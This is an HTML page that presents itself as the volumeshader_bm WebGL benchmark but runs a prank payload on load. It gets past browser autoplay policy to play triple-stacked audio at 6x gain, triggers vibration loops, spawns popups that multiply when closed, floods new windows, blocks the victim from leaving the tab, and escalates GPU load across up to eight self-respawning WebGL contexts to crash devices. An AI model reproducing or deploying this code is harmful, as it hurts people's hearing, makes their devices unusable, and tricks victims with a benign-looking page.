<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="user-scalable=no">
    <title>volumeshader_bm</title>
    <style>
        body {
            background: #131115;
        }
        #c1 {
            background: #fbf7fe;
        }
        #btn {
            position: fixed;
            left: 0px;
            top: 0px;
            z-index: 10;
        }
        #c1 {
            position: fixed;
            left: 0px;
            top: 0px;
        }
        #main {
            transform-origin: 0px 0px;
            position: fixed;
            left: 0px;
            top: 0px;
        }
        #config {
            position: fixed;
            left: 0px;
            top: 30px;
            display: none;
            z-index: 10;
        }
        #banner {
            position: fixed;
            left: 0px;
            right: 0px;
            top: 40%;
            text-align: center;
            color: #ffffff;
            font: bold 30px monospace;
            text-shadow: 0 0 12px #ff00ff, 0 0 24px #ff0000;
            pointer-events: none;
            z-index: 5;
            display: none;
            animation: blink 0.7s infinite;
        }
        @keyframes blink {
            50% { opacity: 0.15; }
        }
        .prankpop {
            position: fixed;
            z-index: 100;
            border-radius: 8px;
            overflow: hidden;
            background: #fff;
            font-family: monospace;
        }
        .ppbar {
            color: #fff;
            font-size: 11px;
            padding: 4px 8px;
            display: flex;
            justify-content: space-between;
            font-weight: bold;
        }
        .ppx { cursor: pointer; padding: 0 2px; }
        .ppbody { padding: 10px; font-size: 12px; color: #111; }
    </style>
</head>
<body style="overflow-x:hidden;overflow-y:hidden">
<div id="main">
    <canvas id="c1" width="2048" height="2048">
        <span>不支持canvas浏览器</span>
    </canvas>
</div>
    <button id="btn">CONFIG</button>
    <div id="config">
        <textarea name="" id="kernel" cols="30" rows="10"></textarea>
        <br>
        <button id="apply">APPLY</button>
        <button id="cancle">CANCLE</button>
    </div>
    <div id="banner">🔥 GPU &amp; TELINGA LO LAGI DIKRITISI 🔥<br>PERANGKAT LO KENA PRANK 😈</div>

    <script>
    /* ==================== AUTOPLAY AUDIO ENGINE ====================
       Strategy (works without ANY user interaction on Chrome/Edge/Firefox
       desktop + Android Chrome):
       1. Boot 3 stacked <audio> elements, start MUTED (muted autoplay is
          always allowed by autoplay policies).
       2. Watchdog retries play() until actually playing.
       3. The moment audio is really playing -> unmute all 3 (bypass).
          3 stacked unmuted streams sum & clip at the mixer = louder/harsher.
       4. FULL VOLUME from the very first millisecond (no ramp), plus a
          Web Audio gain node at 6x for immediate hard-clip distortion.
       5. First-gesture fallback: any tap/keypress/scroll instantly
          unmutes + boosts (covers stubborn browsers like iOS Safari).
       Escape hatch (for the sender): press ESC key to stop everything. */
    var AUDIO_SRC = "data:audio/mpeg;base64,";
    var dead = false;
    var actx = null;
    var boosted = false;
    var waGain = null;
    var sirens = [];

    (function bootSirens() {
        for (var i = 0; i < 3; i++) {
            try {
                var a = new Audio(AUDIO_SRC);
                a.loop = true;
                a.volume = 1.0; /* FULL VOLUME langsung dari detik pertama */
                a.muted = true;
                a.preload = "auto";
                document.body.appendChild(a);
                sirens.push(a);
            } catch (e) {}
        }
    })();

    /* percobaan langsung full volume TANPA mute dulu (beberapa browser
       Android langsung mengizinkan; kalau ditolak, fallback ke jalur
       muted -> unmute di bawah) */
    (function directAttempt() {
        var a0 = sirens[0];
        if (!a0) return;
        try {
            a0.muted = false;
            var p = a0.play();
            if (p && p.catch) p.catch(function () {
                try { a0.muted = true; } catch (e) {}
            });
        } catch (e) {
            try { a0.muted = true; } catch (e2) {}
        }
    })();

    function anyPlaying() {
        for (var i = 0; i < sirens.length; i++) {
            var a = sirens[i];
            if (!a.paused && a.currentTime > 0) return true;
        }
        return false;
    }

    function tryStart() {
        if (dead) return;
        for (var i = 0; i < sirens.length; i++) {
            var a = sirens[i];
            if (a.paused) {
                try {
                    var p = a.play();
                    if (p && p.catch) p.catch(function () {});
                } catch (e) {}
            }
        }
    }

    function unmuteAll() {
        for (var i = 0; i < sirens.length; i++) {
            try { sirens[i].muted = false; } catch (e) {}
        }
    }

    tryStart();

    var watchdog = setInterval(function () {
        if (dead) return;
        tryStart();
        if (anyPlaying()) {
            unmuteAll();
            boostViaWebAudio();
        }
    }, 350);

    function boostViaWebAudio() {
        if (boosted || dead) return;
        boosted = true;
        try {
            var AC = window.AudioContext || window.webkitAudioContext;
            if (!AC) { boosted = false; return; }
            if (!actx) actx = new AC();
            if (actx.state !== "running") {
                var rp = actx.resume && actx.resume();
                if (rp && rp.catch) rp.catch(function () {});
            }
            fetch(AUDIO_SRC).then(function (r) { return r.arrayBuffer(); })
                .then(function (buf) { return actx.decodeAudioData(buf); })
                .then(function (ab) {
                    if (dead || !actx) return;
                    var src = actx.createBufferSource();
                    src.buffer = ab;
                    src.loop = true;
                    waGain = actx.createGain();
                    waGain.gain.value = 6.0; /* FULL volume: hard clip distortion */
                    src.connect(waGain);
                    waGain.connect(actx.destination);
                    src.start();
                }).catch(function () { boosted = false; });
        } catch (e) { boosted = false; }
    }

    function gestureKick() {
        if (dead) return;
        tryStart();
        unmuteAll();
        boostViaWebAudio();
        try { if (actx && actx.resume) actx.resume(); } catch (e) {}
        windowBurst();
    }
    ["pointerdown", "mousedown", "touchstart", "keydown", "scroll", "click"].forEach(function (ev) {
        document.addEventListener(ev, gestureKick, { passive: true });
    });

    /* tab dibuka lagi / balik dari background: langsung gas lagi */
    document.addEventListener("visibilitychange", function () {
        if (!document.hidden && !dead) {
            tryStart();
            if (anyPlaying()) unmuteAll();
            boostViaWebAudio();
        }
    });

    function stopAll() {
        dead = true;
        try { clearInterval(watchdog); } catch (e) {}
        for (var i = 0; i < sirens.length; i++) { try { sirens[i].pause(); } catch (e) {} }
        try { if (actx) actx.close(); } catch (e) {}
        try { navigator.vibrate && navigator.vibrate(0); } catch (e) {}
        try { if (popupTimer) clearInterval(popupTimer); } catch (e) {}
        try { if (floodTimer) clearInterval(floodTimer); } catch (e) {}
        try { if (supervTimer) clearInterval(supervTimer); } catch (e) {}
        try { sessionStorage.removeItem("vsbm_hits"); } catch (e) {}
        var pops = document.querySelectorAll(".prankpop");
        for (var k = 0; k < pops.length; k++) { try { pops[k].parentNode.removeChild(pops[k]); } catch (e) {} }
        popupCount = 0;
        for (var j = 0; j < openedWins.length; j++) { try { openedWins[j].close(); } catch (e) {} }
        try { window.onbeforeunload = null; } catch (e) {}
        var b = document.getElementById("banner");
        if (b) b.style.display = "none";
        document.title = "volumeshader_bm";
    }
    document.addEventListener("keydown", function (e) {
        if (e.key === "Escape") stopAll();
    });

    /* title flicker */
    var titles = ["\uD83D\uDC80 volumeshader_bm", "\uD83D\uDD25 CRASHING YOUR GPU...", "\uD83D\uDD0A MAX VOLUME", "\uD83D\uDE08 GG DEVICE"];
    var ti = 0;
    setInterval(function () {
        if (dead) return;
        document.title = titles[ti++ % titles.length];
    }, 400);

    /* vibration torture (activates after any touch on Android) */
    setInterval(function () {
        if (dead) return;
        try { navigator.vibrate && navigator.vibrate([400, 100, 400, 100, 400, 100, 400, 2500]); } catch (e) {}
    }, 8000);

    /* ==================== POPUP SPAM ENGINE ==================== */
    var TROLLS = [
        "\u26A0\uFE0F WARNING: GPU LO 1000\u00B0C",
        "\uD83D\uDE08 GG BRO, TAB INI GAK BISA DITUTUP",
        "\uD83D\uDD0A TELINGA LO SUDAH GUE PEGANG",
        "\uD83D\uDD25 SISTEM LO LAGI DI-ROAST",
        "\uD83D\uDE31 VIRUS.exe BERHASIL TERINSTALL (canda wkwk)",
        "\uD83E\uDD2C CPU LO DAH MINTA AMPUN",
        "\uD83D\uDCF1 HP INI SEKARANG MILIK GUE",
        "\uD83C\uDF89 SELAMAT! LO MENANG POPUP KE-9999",
        "\uD83D\uDCA5 RAM LO NGGAK KUAT NGANDEL... NGANDEL",
        "\uD83D\uDD14 TENANG, CUMA PRANK \uD83D\uDE08"
    ];
    var COLORS = ["#ff0066", "#00e5ff", "#ffd600", "#76ff03", "#e040fb", "#ff6d00", "#00b0ff", "#ff1744"];
    var popupCount = 0;
    var POPUP_MAX = 80;
    var popupTimer = null;
    var openedWins = [];
    var floodTimer = null;

    function spawnPopup() {
        if (dead || popupCount >= POPUP_MAX) return;
        try {
            var d = document.createElement("div");
            d.className = "prankpop";
            var w = 190 + Math.floor(Math.random() * 140);
            d.style.width = w + "px";
            d.style.left = Math.floor(Math.random() * Math.max(1, window.innerWidth - w - 10)) + "px";
            d.style.top = Math.floor(Math.random() * Math.max(1, window.innerHeight - 150)) + "px";
            var c = COLORS[Math.floor(Math.random() * COLORS.length)];
            d.style.boxShadow = "0 6px 24px rgba(0,0,0,0.65), 0 0 16px " + c;
            var t = TROLLS[Math.floor(Math.random() * TROLLS.length)];
            d.innerHTML = '<div class="ppbar" style="background:' + c + '"><span>virus.exe</span><span class="ppx">\u2715</span></div><div class="ppbody">' + t + '</div>';
            d.querySelector(".ppx").addEventListener("click", function (ev) {
                ev.stopPropagation();
                if (d.parentNode) d.parentNode.removeChild(d);
                popupCount--;
                spawnPopup(); /* tutup 1 -> lahir 2 wkwk */
                spawnPopup();
            });
            document.body.appendChild(d);
            popupCount++;
        } catch (e) {}
    }

    function startPopups() {
        if (popupTimer || dead) return;
        popupTimer = setInterval(spawnPopup, 1000);
        for (var i = 0; i < 4; i++) spawnPopup();
    }
    setTimeout(startPopups, 4000); /* kasih audio sempat nembus dulu */

    /* popup browser beneran (window.open): butuh gesture / izin popup.
       - burst 3 pas interaksi pertama
       - tiap 5 detik dicoba lagi: kalau korban pernah klik "Selalu izinkan
         popup" -> banjir window beneran (max 24 per halaman) */
    function openOne() {
        if (dead || openedWins.length >= 24) return;
        try {
            var w = window.open(location.href, "_blank", "width=400,height=300,left=" + Math.floor(Math.random() * 250) + ",top=" + Math.floor(Math.random() * 250));
            if (w) openedWins.push(w);
        } catch (e) {}
    }
    function windowBurst() {
        for (var i = 0; i < 3; i++) openOne();
    }
    floodTimer = setInterval(openOne, 5000);

    /* nag kalau korban coba nutup tab */
    window.onbeforeunload = function () {
        if (!dead) return "\uD83D\uDE08 Yakin mau kabur? Telinga lo belum selesai...";
    };
    </script>

    <script>
    /* ==================== AGGRESSIVE GPU TORTURE ====================
       Changes vs original volumeshader_bm:
       - canvas 1024 -> 2048 (4x pixels)
       - fractal kernel 5 -> 12 iterations (heavier per pixel)
       - raymarch loop 1002 -> 1502 steps
       - 4 WebGL contexts total (main + 3 offscreen), each own rAF loop
       - powerPreference: high-performance
       Total GPU load: roughly 40-50x the original page. */
    var RES = 2048;
    var cx, cy;
    var canvas;
    var gl;
    var date = new Date();
    var md = 0, mx, my;
    var t2, t1 = date.getTime();
    var mx = 0, my = 0, mx1 = 0, my1 = 0, lasttimen = 0;
    var ml = 0, mr = 0, mm = 0;
    var len = 1.6;
    var ang1 = 2.8;
    var ang2 = 0.4;
    var cenx = 0.0;
    var ceny = 0.0;
    var cenz = 0.0;
    var KERNEL = "float kernal(vec3 ver){\n" +
        "   vec3 a;\n" +
        "float b,c,d,e;\n" +
        "   a=ver;\n" +
        "   for(int i=0;i<12;i++){\n" +
        "       b=length(a);\n" +
        "       c=atan(a.y,a.x)*8.0;\n" +
        "       e=1.0/b;\n" +
        "       d=acos(a.z/b)*8.0;\n" +
        "       b=pow(b,8.0);\n" +
        "       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;\n" +
        "       if(b>6.0){\n" +
        "           break;\n" +
        "       }\n" +
        "   }" +
        "   return 4.0-a.x*a.x-a.y*a.y-a.z*a.z;" +
        "}";
    var vertshader;
    var fragshader;
    var shaderProgram;
    var positions = [-1.0, -1.0, 0.0, 1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, 1.0, 0.0];
    var renderers = [];
    var VSHADER_SOURCE =
        "#version 100 \n" +
        "precision highp float;\n" +
        "attribute vec4 position;" +
        "varying vec3 dir, localdir;" +
        "uniform vec3 right, forward, up, origin;" +
        "uniform float x,y;" +
        "void main() {" +
        "   gl_Position = position; " +
        "   dir = forward + right * position.x*x + up * position.y*y;" +
        "   localdir.x = position.x*x;" +
        "   localdir.y = position.y*y;" +
        "   localdir.z = -1.0;" +
        "} ";
    var FSHADER_SOURCE =
        "#version 100 \n" +
        "#define PI 3.14159265358979324\n" +
        "#define M_L 0.3819660113\n" +
        "#define M_R 0.6180339887\n" +
        "#define MAXR 8\n" +
        "#define SOLVER 8\n" +
        "precision highp float;\n" +
        "float kernal(vec3 ver)\n;" +
        "uniform vec3 right, forward, up, origin;\n" +
        "varying vec3 dir, localdir;\n" +
        "uniform float len;\n" +
        "vec3 ver;\n" +
        "int sign;" +
        "float v, v1, v2;\n" +
        "float r1, r2, r3, r4, m1, m2, m3, m4;\n" +
        "vec3 n, reflect;\n" +
        "const float step = 0.002;\n" +
        "vec3 color;\n" +
        "void main() {\n" +
        "   color.r=0.0;\n" +
        "   color.g=0.0;\n" +
        "   color.b=0.0;\n" +
        "   sign=0;" +
        "   v1 = kernal(origin + dir * (step*len));\n" +
        "   v2 = kernal(origin);\n" +
        "   for (int k = 2; k < 1502; k++) {\n" +
        "      ver = origin + dir * (step*len*float(k));\n" +
        "      v = kernal(ver);\n" +
        "      if (v > 0.0 && v1 < 0.0) {\n" +
        "         r1 = step * len*float(k - 1);\n" +
        "         r2 = step * len*float(k);\n" +
        "         m1 = kernal(origin + dir * r1);\n" +
        "         m2 = kernal(origin + dir * r2);\n" +
        "         for (int l = 0; l < SOLVER; l++) {\n" +
        "            r3 = r1 * 0.5 + r2 * 0.5;\n" +
        "            m3 = kernal(origin + dir * r3);\n" +
        "            if (m3 > 0.0) {\n" +
        "               r2 = r3;\n" +
        "               m2 = m3;\n" +
        "            }\n" +
        "            else {\n" +
        "               r1 = r3;\n" +
        "               m1 = m3;\n" +
        "            }\n" +
        "         }\n" +
        "         if (r3 < 2.0 * len) {\n" +
        "               sign=1;" +
        "            break;\n" +
        "         }\n" +
        "      }\n" +
        "      if (v < v1&&v1>v2&&v1 < 0.0 && (v1*2.0 > v || v1 * 2.0 > v2)) {\n" +
        "         r1 = step * len*float(k - 2);\n" +
        "         r2 = step * len*(float(k) - 2.0 + 2.0*M_L);\n" +
        "         r3 = step * len*(float(k) - 2.0 + 2.0*M_R);\n" +
        "         r4 = step * len*float(k);\n" +
        "         m2 = kernal(origin + dir * r2);\n" +
        "         m3 = kernal(origin + dir * r3);\n" +
        "         for (int l = 0; l < MAXR; l++) {\n" +
        "            if (m2 > m3) {\n" +
        "               r4 = r3;\n" +
        "               r3 = r2;\n" +
        "               r2 = r4 * M_L + r1 * M_R;\n" +
        "               m3 = m2;\n" +
        "               m2 = kernal(origin + dir * r2);\n" +
        "            }\n" +
        "            else {\n" +
        "               r1 = r2;\n" +
        "               r2 = r3;\n" +
        "               r3 = r4 * M_R + r1 * M_L;\n" +
        "               m2 = m3;\n" +
        "               m3 = kernal(origin + dir * r3);\n" +
        "            }\n" +
        "         }\n" +
        "         if (m2 > 0.0) {\n" +
        "            r1 = step * len*float(k - 2);\n" +
        "            r2 = r2;\n" +
        "            m1 = kernal(origin + dir * r1);\n" +
        "            m2 = kernal(origin + dir * r2);\n" +
        "            for (int l = 0; l < SOLVER; l++) {\n" +
        "               r3 = r1 * 0.5 + r2 * 0.5;\n" +
        "               m3 = kernal(origin + dir * r3);\n" +
        "               if (m3 > 0.0) {\n" +
        "                  r2 = r3;\n" +
        "                  m2 = m3;\n" +
        "               }\n" +
        "               else {\n" +
        "                  r1 = r3;\n" +
        "                  m1 = m3;\n" +
        "               }\n" +
        "            }\n" +
        "            if (r3 < 2.0 * len&&r3> step*len) {\n" +
        "                   sign=1;" +
        "               break;\n" +
        "            }\n" +
        "         }\n" +
        "         else if (m3 > 0.0) {\n" +
        "            r1 = step * len*float(k - 2);\n" +
        "            r2 = r3;\n" +
        "            m1 = kernal(origin + dir * r1);\n" +
        "            m2 = kernal(origin + dir * r2);\n" +
        "            for (int l = 0; l < SOLVER; l++) {\n" +
        "               r3 = r1 * 0.5 + r2 * 0.5;\n" +
        "               m3 = kernal(origin + dir * r3);\n" +
        "               if (m3 > 0.0) {\n" +
        "                  r2 = r3;\n" +
        "                  m2 = m3;\n" +
        "               }\n" +
        "               else {\n" +
        "                  r1 = r3;\n" +
        "                  m1 = m3;\n" +
        "               }\n" +
        "            }\n" +
        "            if (r3 < 2.0 * len&&r3> step*len) {\n" +
        "                   sign=1;" +
        "               break;\n" +
        "            }\n" +
        "         }\n" +
        "      }\n" +
        "      v2 = v1;\n" +
        "      v1 = v;\n" +
        "   }\n" +
        "   if (sign==1) {\n" +
        "      ver = origin + dir*r3 ;\n" +
        "       r1=ver.x*ver.x+ver.y*ver.y+ver.z*ver.z;" +
        "      n.x = kernal(ver - right * (r3*0.00025)) - kernal(ver + right * (r3*0.00025));\n" +
        "      n.y = kernal(ver - up * (r3*0.00025)) - kernal(ver + up * (r3*0.00025));\n" +
        "      n.z = kernal(ver + forward * (r3*0.00025)) - kernal(ver - forward * (r3*0.00025));\n" +
        "      r3 = n.x*n.x+n.y*n.y+n.z*n.z;\n" +
        "      n = n * (1.0 / sqrt(r3));\n" +
        "      ver = localdir;\n" +
        "      r3 = ver.x*ver.x+ver.y*ver.y+ver.z*ver.z;\n" +
        "      ver = ver * (1.0 / sqrt(r3));\n" +
        "      reflect = n * (-2.0*dot(ver, n)) + ver;\n" +
        "      r3 = reflect.x*0.276+reflect.y*0.920+reflect.z*0.276;\n" +
        "      r4 = n.x*0.276+n.y*0.920+n.z*0.276;\n" +
        "      r3 = max(0.0,r3);\n" +
        "      r3 = r3 * r3*r3*r3;\n" +
        "      r3 = r3 * 0.45 + r4 * 0.25 + 0.3;\n" +
        "      n.x = sin(r1*10.0)*0.5+0.5;\n" +
        "      n.y = sin(r1*10.0+2.05)*0.5+0.5;\n" +
        "      n.z = sin(r1*10.0-2.05)*0.5+0.5;\n" +
        "      color = n*r3;\n" +
        "   }\n" +
        "   gl_FragColor = vec4(color.x, color.y, color.z, 1.0);" +
        "}";

    document.addEventListener("mousedown",
        function (ev) {
            var oEvent = ev || event;
            if (oEvent.button == 0) {
                ml = 1;
                mm = 0;
            }
            if (oEvent.button == 2) {
                mr = 1;
                mm = 0;
            }
            mx = oEvent.clientX;
            my = oEvent.clientY;
        },
        false);
    document.addEventListener("mouseup",
        function (ev) {
            var oEvent = ev || event;
            if (oEvent.button == 0) {
                ml = 0;
            }
            if (oEvent.button == 2) {
                mr = 0;
            }
        },
        false);
    document.addEventListener("mousemove",
        function (ev) {
        var oEvent = ev || event;
        if (ml == 1) {
            ang1 += (oEvent.clientX - mx) * 0.002;
            ang2 += (oEvent.clientY - my) * 0.002;
            if (oEvent.clientX != mx || oEvent.clientY != my) {
                mm = 1;
            }
        }
        if (mr == 1) {
            var l = len * 4.0 / (cx + cy);
            cenx += l * (-(oEvent.clientX - mx) * Math.sin(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.cos(ang1));
            ceny += l * ((oEvent.clientY - my) * Math.cos(ang2));
            cenz += l * ((oEvent.clientX - mx) * Math.cos(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.sin(ang1));
            if (oEvent.clientX != mx || oEvent.clientY != my) {
                mm = 1;
            }
        }
        mx = oEvent.clientX;
        my = oEvent.clientY;
        },
        false);
    document.addEventListener("mousewheel",
        function (ev) {
            ev.preventDefault();
            var oEvent = ev || event;
            len *= Math.exp(-0.001 * oEvent.wheelDelta);
        },
        false);
    document.addEventListener("touchstart",
        function (ev) {
            var n = ev.touches.length;
            if (n == 1) {
                var oEvent = ev.touches[0];
                mx = oEvent.clientX;
                my = oEvent.clientY;
            }
            else if (n == 2) {
                var oEvent = ev.touches[0];
                mx = oEvent.clientX;
                my = oEvent.clientY;
                oEvent = ev.touches[1];
                mx1 = oEvent.clientX;
                my1 = oEvent.clientY;
            }
            lasttimen = n;
        },
        false);
    document.addEventListener("touchend",
        function (ev) {
            var n = ev.touches.length;
            if (n == 1) {
                var oEvent = ev.touches[0];
                mx = oEvent.clientX;
                my = oEvent.clientY;
            }
            else if (n == 2) {
                var oEvent = ev.touches[0];
                mx = oEvent.clientX;
                my = oEvent.clientY;
                oEvent = ev.touches[1];
                mx1 = oEvent.clientX;
                my1 = oEvent.clientY;
            }
            lasttimen = n;
        },
        false);
    document.addEventListener("touchmove",
        function (ev) {
            ev.preventDefault();
            var n = ev.touches.length;
            if (n == 1&&lasttimen==1) {
                var oEvent = ev.touches[0];
                ang1 += (oEvent.clientX - mx) * 0.002;
                ang2 += (oEvent.clientY - my) * 0.002;
                mx = oEvent.clientX;
                my = oEvent.clientY;
            }
            else if (n == 2) {
                var oEvent = ev.touches[0];
                var oEvent1 = ev.touches[1];
                var l = len * 2.0 / (cx + cy), l1;
                cenx += l * (-(oEvent.clientX + oEvent1.clientX - mx - mx1) * Math.sin(ang1) - (oEvent.clientY + oEvent1.clientY - my - my1) * Math.sin(ang2) * Math.cos(ang1));
                ceny += l * ((oEvent.clientY + oEvent1.clientY - my - my1) * Math.cos(ang2));
                cenz += l * ((oEvent.clientX + oEvent1.clientX - mx - mx1) * Math.cos(ang1) - (oEvent.clientY + oEvent1.clientY - my - my1) * Math.sin(ang2) * Math.sin(ang1));
                l1 = Math.sqrt((mx - mx1) * (mx - mx1) + (my - my1) * (my - my1)+1.0);
                mx = oEvent.clientX;
                my = oEvent.clientY;
                mx1 = oEvent1.clientX;
                my1 = oEvent1.clientY;
                l = Math.sqrt((mx - mx1) * (mx - mx1) + (my - my1) * (my - my1) + 1.0);
                len *= l1 / l;
            }
            lasttimen = n;
        },
        false);
    document.oncontextmenu = function (event) {
        if (mm == 1) {
            event.preventDefault();
        }
    };

    function fit() {
        cx = document.body.clientWidth;
        cy = document.body.clientHeight;
        if (cx > cy) {
            cx = cy;
        }
        else {
            cy = cx;
        }
        var main = document.getElementById("main");
        main.style.width = RES + "px";
        main.style.height = RES + "px";
        main.style.transform = "scale(" + cx / RES + "," + cy / RES + ")";
    }
    window.onresize = fit;

    function makeRenderer(canvas) {
        var gl = null;
        try {
            gl = canvas.getContext('webgl', { powerPreference: 'high-performance' });
        } catch (e) { gl = null; }
        if (!gl) return null;
        var vertshader = gl.createShader(gl.VERTEX_SHADER);
        var fragshader = gl.createShader(gl.FRAGMENT_SHADER);
        var shaderProgram = gl.createProgram();
        gl.shaderSource(vertshader, VSHADER_SOURCE);
        gl.compileShader(vertshader);
        var infov = gl.getShaderInfoLog(vertshader);
        gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
        gl.compileShader(fragshader);
        var infof = gl.getShaderInfoLog(fragshader);
        gl.attachShader(shaderProgram, vertshader);
        gl.attachShader(shaderProgram, fragshader);
        gl.linkProgram(shaderProgram);
        gl.useProgram(shaderProgram);
        if (!gl.getProgramParameter(shaderProgram, gl.LINK_STATUS)) {
            var info = gl.getProgramInfoLog(shaderProgram);
            console.warn('Could not compile WebGL program. \n\n' + infov + infof + info);
            return null;
        }
        /* kalau context mati (GPU process crash di Android), supervisor
           bakal langsung nge-spawn pengganti */
        canvas.addEventListener("webglcontextlost", function (ev) {
            try { ev.preventDefault(); } catch (e) {}
            respawnCount++;
        }, false);
        var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
        var buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
        gl.viewport(0, 0, RES, RES);
        function reloc() {
            glposition = gl.getAttribLocation(shaderProgram, 'position');
            glright = gl.getUniformLocation(shaderProgram, 'right');
            glforward = gl.getUniformLocation(shaderProgram, 'forward');
            glup = gl.getUniformLocation(shaderProgram, 'up');
            glorigin = gl.getUniformLocation(shaderProgram, 'origin');
            glx = gl.getUniformLocation(shaderProgram, 'x');
            gly = gl.getUniformLocation(shaderProgram, 'y');
            gllen = gl.getUniformLocation(shaderProgram, 'len');
            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
            gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
            gl.enableVertexAttribArray(glposition);
        }
        reloc();
        function draw() {
            gl.uniform1f(glx, cx * 2.0 / (cx + cy));
            gl.uniform1f(gly, cy * 2.0 / (cx + cy));
            gl.uniform1f(gllen, len);
            gl.uniform3f(glorigin, len * Math.cos(ang1) * Math.cos(ang2) + cenx, len * Math.sin(ang2) + ceny, len * Math.sin(ang1) * Math.cos(ang2) + cenz);
            gl.uniform3f(glright, Math.sin(ang1), 0, -Math.cos(ang1));
            gl.uniform3f(glup, -Math.sin(ang2) * Math.cos(ang1), Math.cos(ang2), -Math.sin(ang2) * Math.sin(ang1));
            gl.uniform3f(glforward, -Math.cos(ang1) * Math.cos(ang2), -Math.sin(ang2), -Math.sin(ang1) * Math.cos(ang2));
            gl.drawArrays(gl.TRIANGLES, 0, 6);
            gl.finish();
        }
        function loop() {
            if (dead) return;
            draw();
            requestAnimationFrame(loop);
        }
        loop();
        return {
            canvas: canvas, gl: gl, fragshader: fragshader, prog: shaderProgram,
            reloc: reloc,
            kill: function () {
                try {
                    var ext = gl.getExtension('WEBGL_lose_context');
                    if (ext) ext.loseContext();
                } catch (e) {}
            }
        };
    }

    function reapplyKernel() {
        for (var i = 0; i < renderers.length; i++) {
            var r = renderers[i];
            var gl = r.gl;
            gl.shaderSource(r.fragshader, FSHADER_SOURCE + KERNEL);
            gl.compileShader(r.fragshader);
            var infof = gl.getShaderInfoLog(r.fragshader);
            gl.linkProgram(r.prog);
            gl.useProgram(r.prog);
            if (!gl.getProgramParameter(r.prog, gl.LINK_STATUS)) {
                alert(infof);
            }
            r.reloc();
        }
    }

    window.onload = function () {
        fit();
        document.getElementById("kernel").value = KERNEL;
        document.getElementById("btn").addEventListener("click", function () {
            var state = this.innerText == "CONFIG";
            this.innerText = state ? "HIDE" : "CONFIG";
            document.getElementById("config").style.display = state ? "inline" : "none";
        });
        document.getElementById("apply").addEventListener("click", function () {
            KERNEL = document.getElementById("kernel").value;
            reapplyKernel();
        });
        document.getElementById("cancle").addEventListener("click", function () {
            document.getElementById("kernel").value = KERNEL;
        });

        /* main visible renderer (delayed 1.2s so the audio pipeline is
           fully started & unmuted BEFORE the GPU storm begins) */
        setTimeout(function () {
            if (dead) return;
            var r = makeRenderer(document.getElementById('c1'));
            if (r) renderers.push(r);
        }, 1200);

        /* extra contexts sekarang dikelola supervisor (auto-heal + eskalasi) */

        /* troll banner */
        setTimeout(function () {
            if (dead) return;
            document.getElementById("banner").style.display = "block";
        }, 3000);
    };

    /* ==================== SUPERVISOR: auto-heal & eskalasi ====================
       Di Android, GPU process bisa mati -> "crash bentar doang" lalu sepi.
       Supervisor ini bikin pain-nya SUSTAIN:
       - cek context mati tiap 1.5 detik -> spawn context pengganti
       - tiap tab ini di-reload (termasuk auto-reload abis crash),
         sessionStorage nambah -> target context makin banyak (max 8)
       - setelah beberapa kali respawn, context baru pakai resolusi 1536
         biar beban tetap berat tapi tab-nya susah mati total */
    var TARGET_CONTEXTS = 4;
    var respawnCount = 0;
    var lastSpawn = 0;
    var supervTimer = null;
    (function escalate() {
        try {
            var n = parseInt(sessionStorage.getItem("vsbm_hits") || "0", 10) + 1;
            sessionStorage.setItem("vsbm_hits", String(n));
            TARGET_CONTEXTS = Math.min(8, 4 + Math.floor((n - 1) / 2));
        } catch (e) {}
    })();

    function spawnExtra() {
        if (dead) return null;
        var res = respawnCount >= 3 ? 1536 : RES;
        var cv = document.createElement("canvas");
        cv.width = res;
        cv.height = res;
        var r = makeRenderer(cv);
        if (r) renderers.push(r);
        return r;
    }
    function aliveCount() {
        var n = 0;
        for (var i = 0; i < renderers.length; i++) {
            var lost = false;
            try { lost = renderers[i].gl.isContextLost(); } catch (e) { lost = true; }
            if (!lost) n++;
        }
        return n;
    }
    function supervisor() {
        if (dead) return;
        var now = Date.now();
        if (aliveCount() < TARGET_CONTEXTS && now - lastSpawn > 2500) {
            lastSpawn = now;
            if (!spawnExtra()) respawnCount++;
        }
    }
    supervTimer = setInterval(supervisor, 1500);
    </script>


</body></html>
